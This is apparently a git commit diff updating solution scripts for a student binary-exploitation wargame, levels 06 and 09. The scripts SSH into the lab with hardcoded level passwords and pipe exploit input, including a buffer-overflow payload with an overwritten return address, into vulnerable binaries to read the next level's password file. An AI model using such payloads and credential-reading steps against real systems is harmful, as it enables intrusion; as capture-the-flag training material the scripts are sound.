fd9b24f81c904e7e6c228ec732b8687d98fad61a
ChokMania <judumay@student.42.fr>
2021-02-11 11:22:51 +0100

    added some script

--- level06/Ressources/Script_L6.sh
+++ level06/Ressources/Script_L6.sh
@@ -4,7 +4,8 @@ PASS='h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq'
 echo $PASS
 echo $OVERRIDE
 
-sshpass -p $PASS ssh -o StrictHostKeyChecking=no level06@$OVERRIDE -p 4242 << EOF
+sshpass -p $PASS ssh -tt -o StrictHostKeyChecking=no level06@$OVERRIDE -p 4242 << EOF
 SHELL=/bin/sh
-(python -c "print 'victory\n6233784\n'"; echo 'cat /home/users/level07/.pass')| ./level06
+(python -c "print 'victory\n6233784\n'"; echo cat /home/users/level07/.pass; echo pkill -9 level06)| ./level06
+exit
 EOF
--- level09/Ressources/Script_L9.sh
+++ level09/Ressources/Script_L9.sh
@@ -4,7 +4,7 @@ PASS='fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S'
 echo $PASS
 echo $OVERRIDE
 
-sshpass -p $PASS ssh -o StrictHostKeyChecking=no level09@$OVERRIDE -p 4242 << EOF
+sshpass -p $PASS ssh -tt -o StrictHostKeyChecking=no level09@$OVERRIDE -p 4242 << EOF
 (python -c "print 'A' * 40 + '\xff' + '\n' + 'A' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + 'cat /home/users/end/.pass' ") | ./level09
-
+exit
 EOF
